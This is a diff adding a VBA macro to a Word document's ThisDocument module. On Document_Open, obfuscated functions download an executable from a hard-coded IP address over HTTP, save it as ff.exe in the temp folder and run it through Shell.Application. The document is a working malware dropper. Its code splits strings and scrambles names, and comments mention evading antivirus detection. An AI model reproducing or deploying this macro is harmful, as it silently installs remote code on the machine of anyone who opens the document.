@@ -1,0 +1,66 @@
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Sub _
+Document_Open()
+If tru€ = True Then
+End If
+End Sub
+Function ienawiofnkl(ByVal ehiron As Integer) As String
+Dim a As String, b As String, c As Long, d As Long, f As Integer, e As New XMLHTTP30
+d = 0
+a = haeuiüt("m")
+b = "xe"
+a = ighwo(a, "\ff.e", b)
+b = "htt" & "p://" & "80.242.123.155/" & "exe/dro.e" & b
+e.Open "G" & "E" & "T", b, False
+e.send
+If e.Status = (20 * ehiron - 20) Then
+    f = zhjvn()
+    Open a For Binary As #f
+    Put #f, , uingrfdyef(e)
+    Close #f
+End If
+Dim x As Boolean
+x = kubikebnadl(a, "pen")
+ienawiofnkl = ""
+End Function
+
+Function zhjvn() As Integer
+zhjvn = FreeFile()
+End Function
+
+Function ighwo(ByVal iethjo As String, ByVal ihjero As String, ByVal ugjgrJ As String) As String
+ighwo = iethjo & ihjero & ugjgrJ
+End Function
+
+Function haeuiüt(ByVal geggerk As String) As String
+haeuiüt = Environ("t" & geggerk & "p")
+End Function
+
+Function kubikebnadl(ByVal a As String, ByVal b As String) As Boolean 'Panda Detections
+Dim objShell
+Set objShell = CreateObject("Shell.Application")
+objShell.ShellExecute a, "", "", "o" & b, 1
+kubikebnadl = False
+End Function
+
+Function tru€() As Boolean
+ienawiofnkl (11)
+tru€ = True
+End Function
+
+Function uingrfdyef(ByRef eguighoüe As XMLHTTP30) As Byte() 'Not causing additional detections
+Dim b() As Byte
+b = eguighoüe.responseBody
+uingrfdyef = b
+End Function
+
+
+
+
